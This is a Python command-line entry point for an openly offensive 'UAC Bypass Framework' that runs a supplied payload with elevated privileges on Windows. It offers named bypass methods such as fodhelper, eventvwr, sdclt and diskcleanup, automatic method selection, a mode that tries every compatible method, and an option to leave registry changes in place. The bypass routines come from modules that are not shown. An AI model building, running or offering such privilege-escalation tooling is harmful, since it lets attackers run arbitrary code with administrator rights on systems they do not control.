"""
UAC Bypass Framework - Main CLI Entry Point

A modular framework for bypassing Windows User Account Control (UAC)
using multiple techniques for different Windows versions.

Usage:
    python uac_bypass.py --method auto --payload payload.exe
    python uac_bypass.py --method fodhelper --payload payload.exe
    python uac_bypass.py --enumerate
    python uac_bypass.py --test-all --payload payload.exe
"""

import argparse
import sys
import os
import time
from pathlib import Path
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent))

from core.detector import SystemDetector
from core.uac_checker import UACChecker
from bypasses import BYPASS_METHODS
from utils.selector import BypassSelector
from utils.reporter import ReportGenerator
from .utils.helpers import print_banner, check_windows, check_admin_required, validate_payload


def test_all_methods(payload_path: str, output_dir: str, verbose: bool):
    """
    Test all compatible bypass methods.

    Args:
        payload_path: Path to test payload
        output_dir: Output directory
        verbose: Enable verbose output
    """
    print("\n" + "=" * 60)
    print("TESTING ALL COMPATIBLE UAC BYPASS METHODS")
    print("=" * 60)
    print("\n[!] WARNING: This will execute payload multiple times")

    selector = BypassSelector(output_dir, verbose)
    compatible = selector.get_compatible_methods()

    if not compatible:
        print("\n[-] No compatible methods to test")
        return

    results = []

    for method_info in compatible:
        method_name = method_info['name']

        print(f"\n[*] Testing method: {method_name}")
        print("-" * 60)

        try:
            bypass = selector.get_bypass_instance(method_name)

            if bypass:
                success = bypass.execute(payload_path, cleanup=True)

                results.append({
                    'method': method_name,
                    'success': success,
                    'timestamp': datetime.now().isoformat()
                })

                status = "SUCCESS" if success else "FAILED"
                print(f"[{'+' if success else '-'}] {method_name}: {status}")

            # Wait between tests
            time.sleep(2)

        except Exception as e:
            print(f"[-] {method_name}: ERROR - {e}")
            results.append({
                'method': method_name,
                'success': False,
                'error': str(e)
            })

    # Display summary
    print("\n" + "=" * 60)
    print("TEST SUMMARY")
    print("=" * 60)

    success_count = sum(1 for r in results if r['success'])

    for result in results:
        status = "✓" if result['success'] else "✗"
        print(f"  {status} {result['method']}: {'SUCCESS' if result['success'] else 'FAILED'}")

    print(f"\nTotal: {success_count}/{len(results)} methods successful")


def main():
    parser = argparse.ArgumentParser(
        description="UAC Bypass Framework - Windows UAC Bypass Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Automatic method selection:
    python uac_bypass.py --method auto --payload payload.exe

  Use specific method:
    python uac_bypass.py --method fodhelper --payload payload.exe

  Enumerate compatible methods:
    python uac_bypass.py --enumerate

  Test all methods:
    python uac_bypass.py --test-all --payload test_payload.exe

  Generate compatibility report:
    python uac_bypass.py --enumerate --report uac_report.json

Available Methods:
  auto              - Automatically select best method
  fodhelper         - Fodhelper.exe bypass (Win 10 <= 1809)
  eventvwr          - Event Viewer bypass (Win 7/8/10 old)
  sdclt             - Sdclt.exe bypass (Win 10 <= 1803)
  computerdefaults  - ComputerDefaults.exe bypass (Win 10 <= 1803)
  slui              - Slui.exe bypass (Win 8/10)
  diskcleanup       - Disk Cleanup bypass (Win 7+, most reliable)
        """
    )

    # Main operation modes
    mode_group = parser.add_argument_group('Operation Modes')
    mode_group.add_argument('--method', '-m', type=str,
                            choices=['auto', 'fodhelper', 'eventvwr', 'sdclt',
                                     'computerdefaults', 'slui', 'diskcleanup'],
                            help='UAC bypass method to use')
    mode_group.add_argument('--enumerate', '-e', action='store_true',
                            help='Enumerate compatible bypass methods')
    mode_group.add_argument('--test-all', action='store_true',
                            help='Test all compatible methods')

    # Payload options
    payload_group = parser.add_argument_group('Payload Options')
    payload_group.add_argument('--payload', '-p', type=str,
                               help='Payload executable path')
    payload_group.add_argument('--no-cleanup', action='store_true',
                               help='Do not cleanup registry after bypass')

    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('--output-dir', '-o', type=str, default='uac_bypasses',
                              help='Output directory')
    output_group.add_argument('--report', type=str,
                              help='Generate report to specified file')
    output_group.add_argument('--report-format', type=str,
                              choices=['json', 'txt', 'both'], default='json',
                              help='Report format')

    # General options
    general_group = parser.add_argument_group('General Options')
    general_group.add_argument('--verbose', '-v', action='store_true',
                               help='Enable verbose output')
    general_group.add_argument('--quiet', '-q', action='store_true',
                               help='Suppress banner output')

    args = parser.parse_args()

    # Check Windows
    if not check_windows():
        print("[-] This tool only works on Windows systems")
        sys.exit(1)

    # Show banner unless quiet
    if not args.quiet:
        print_banner()

        detector = SystemDetector()
        checker = UACChecker()

        print(f"[*] Windows Version: {detector.get_version()}")
        print(f"[*] Windows Build: {detector.get_build()}")
        print(f"[*] Administrator: {'Yes' if checker.is_admin() else 'No'}")
        print(f"[*] UAC Enabled: {'Yes' if checker.is_uac_enabled() else 'No'}")

    # Handle enumerate mode
    if args.enumerate:
        selector = BypassSelector(args.output_dir, args.verbose)
        selector.enumerate_methods()

        if args.report:
            reporter = ReportGenerator(args.output_dir)

            if args.report_format in ['json', 'both']:
                reporter.generate_json_report(args.report + '.json')
            if args.report_format in ['txt', 'both']:
                reporter.generate_text_report(args.report + '.txt')

    # Handle test-all mode
    elif args.test_all:
        if not check_admin_required():
            sys.exit(1)

        if not args.payload:
            print("[-] --test-all requires --payload")
            sys.exit(1)

        if not validate_payload(args.payload):
            sys.exit(1)

        test_all_methods(args.payload, args.output_dir, args.verbose)

    # Handle bypass execution
    elif args.method:
        if not check_admin_required():
            sys.exit(1)

        if not args.payload:
            print("[-] --method requires --payload")
            sys.exit(1)

        if not validate_payload(args.payload):
            sys.exit(1)

        selector = BypassSelector(args.output_dir, args.verbose)
        bypass = selector.get_bypass_instance(args.method)

        if not bypass:
            print(f"[-] Method '{args.method}' not available or not compatible")
            sys.exit(1)

        success = bypass.execute(args.payload, cleanup=not args.no_cleanup)

        if success:
            print("\n[+] UAC bypass successful!")
            sys.exit(0)
        else:
            print("\n[-] UAC bypass failed")
            sys.exit(1)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()